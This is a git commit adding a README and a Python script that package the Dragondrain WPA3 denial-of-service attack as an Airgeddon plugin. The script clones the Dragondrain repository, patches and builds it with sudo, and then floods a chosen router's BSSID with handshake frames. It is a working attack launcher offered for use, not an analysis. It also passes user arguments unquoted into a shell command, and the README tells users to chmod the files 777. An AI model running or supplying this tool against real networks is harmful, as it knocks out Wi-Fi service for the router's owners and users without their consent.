99749dd0cff6f5e89524965ca98b19a32a1ae812
Janek <miauczec_sloiki_0@icloud.com>
2025-06-02 22:22:42 +0100

    Initial drop

--- README.md
+++ README.md
@@ -1,2 +1,17 @@
 # Dragon-Bleed-WPA3-Airgeddon-Plugin
 Dragon Bleed attack packaged as Airgeddon Plugin
+
+# How Dragon Bleed works
+Dragon bleed attack overflows WPA3 routers by sending heavy requests in large amount.
+
+# What does this plugin do
+This plugin checks out dragon bleed from GIT, edits it, compiles it and runs it.
+
+# How to install
+Just copy both files to plugins folder in airgeddon and chmod them to 777.
+
+# How to run
+Select Dragon Bleed attack option from Airgeddon menu and select the WPA target.
+
+# TODO List
+Translate messages to other languages.
---
+++ wpa3_dragon_bleed_attack.py
@@ -0,0 +1,48 @@
+import os
+import argparse
+import subprocess
+
+# Define the file path to check
+FILE_PATH = "/dragondrain/src/dragondrain"
+
+# Define the commands to run if the file does not exist
+INSTALL_COMMANDS = [
+    "sudo apt-get install -y autoconf automake libtool shtool libssl-dev pkg-config",
+    "sudo rm -rf /dragondrain",
+    "sudo git clone https://github.com/vanhoefm/dragondrain-and-time.git /dragondrain",
+    "cd /dragondrain && sudo autoreconf -i", 
+    "cd /dragondrain && sudo ./autogen.sh", 
+    "cd /dragondrain && sudo ./configure",
+    "sudo sed -i '42s/ __packed//' /dragondrain/src/aircrack-osdep/radiotap/radiotap.h",
+    "cd /dragondrain && sudo make"
+]
+
+def check_and_install():
+    if not os.path.exists(FILE_PATH):
+        print(f"File {FILE_PATH} not found. Running installation commands...")
+        for command in INSTALL_COMMANDS:
+            subprocess.run(command, shell=True, check=True)
+
+def run_final_command(bssid, channel, interface):
+    # Dynamically generate the FINAL_COMMAND string with user-provided arguments
+    final_command = f"sudo /dragondrain/src/dragondrain -d {interface} -a {bssid} -c {channel} -b 54 -n 20 -r 200"
+    
+    print(f"Running final command: {final_command}")
+    subprocess.run(final_command, shell=True, check=True, input=b"\n")
+
+def main():
+    parser = argparse.ArgumentParser(description="Script to check file existence, install dependencies, and execute dragon drain command.")
+    parser.add_argument("bssid", help="BSSID parameter")
+    parser.add_argument("channel", help="Channel parameter")
+    parser.add_argument("interface", help="Network interface parameter")
+
+    args = parser.parse_args()
+
+    print(f"Received parameters: BSSID={args.bssid}, Channel={args.channel}, Interface={args.interface}")
+
+    check_and_install()
+    run_final_command(args.bssid, args.channel, args.interface)
+
+if __name__ == "__main__":
+    main()
+
